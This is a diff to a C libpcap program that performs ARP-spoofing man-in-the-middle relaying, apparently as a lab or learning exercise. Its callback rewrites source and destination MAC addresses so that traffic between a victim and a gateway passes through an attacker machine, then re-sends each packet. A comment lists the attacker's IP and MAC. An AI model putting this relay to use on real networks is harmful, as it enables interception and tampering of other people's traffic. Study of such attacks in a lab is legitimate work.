@@ -100,11 +100,14 @@ int main(int argc, char **argv) {
 		print_ether_header(pkt_data);
 		pkt_data += ARP_HEADER_JMP;
 		print_arp_header(pkt_data);
+
+		pcap_loop(use_dev, 0, callback, NULL);
+		pcap_close(use_dev);
 	}
 
-	pcap_loop(use_dev, 0, callback, NULL);
+	/*pcap_loop(use_dev, 0, callback, NULL);
 	pcap_close(use_dev);
-
+	*/
 	return 0;
 }
 //main 끝
@@ -137,7 +140,6 @@ void print_arp_header(const unsigned char *pkt_data) {
 	printf("\n Target IP : \n");
 	for (int i = 0; i <= 3; i++) printf("%d.", ah->target_ip[i]);
 
-
 }
 /*공격자 ip : 192.168.25.15
 공격자 mac : 00:e0:4c:61:c8:1f
@@ -161,11 +163,17 @@ void callback(unsigned char *param, const struct pcap_pkthdr *header, const unsi
 		memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
 		memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
 	}
+
 	if ((memcmp(GATEWAY_MAC, eh->src_mac, sizeof(eh->src_mac))) == 0)
 	{
 		printf("GATEWAY -> VICTIM\n");
 		memcpy(eh->src_mac, ATTACK_MAC, sizeof(eh->src_mac));
 		memcpy(eh->dest_mac, VICTIM_MAC, sizeof(eh->dest_mac));
+	}
+	//attacker -> attacker
+	if ((memcmp(ATTACK_MAC, eh->src_mac, sizeof(eh->src_mac))) && (memcmp(ATTACK_MAC, eh->dest_mac, sizeof(eh->dest_mac)))==0) {
+		printf("ATTACK -> GATEWAY");
+		memcpy(eh->dest_mac, GATEWAY_MAC, sizeof(eh->dest_mac));
 	}
 
 	pcap_sendpacket(use_dev, pkt_data, header->caplen);
